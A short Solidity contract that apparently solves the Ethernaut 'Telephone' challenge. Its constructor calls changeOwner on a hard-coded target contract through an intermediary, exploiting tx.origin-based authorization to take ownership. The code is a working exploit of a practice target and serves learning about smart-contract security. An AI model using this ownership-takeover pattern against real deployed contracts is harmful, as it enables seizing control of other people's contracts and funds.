//SPDX-License-Identifer: MIT

pragma solidity ^0.8.17;

interface ITelephone {
    function changeOwner(address _owner) external;

    function owner() external view returns (address);
}

contract TelephoneCaller {
    ITelephone telephoneContract;

    constructor() {
        telephoneContract = ITelephone(
            0x3bFf47d44ad9306c2b4ED41880d821736920F232
        );
        telephoneContract.changeOwner(msg.sender);
    }

    function getOwner() external view returns (address) {
        return telephoneContract.owner();
    }
}
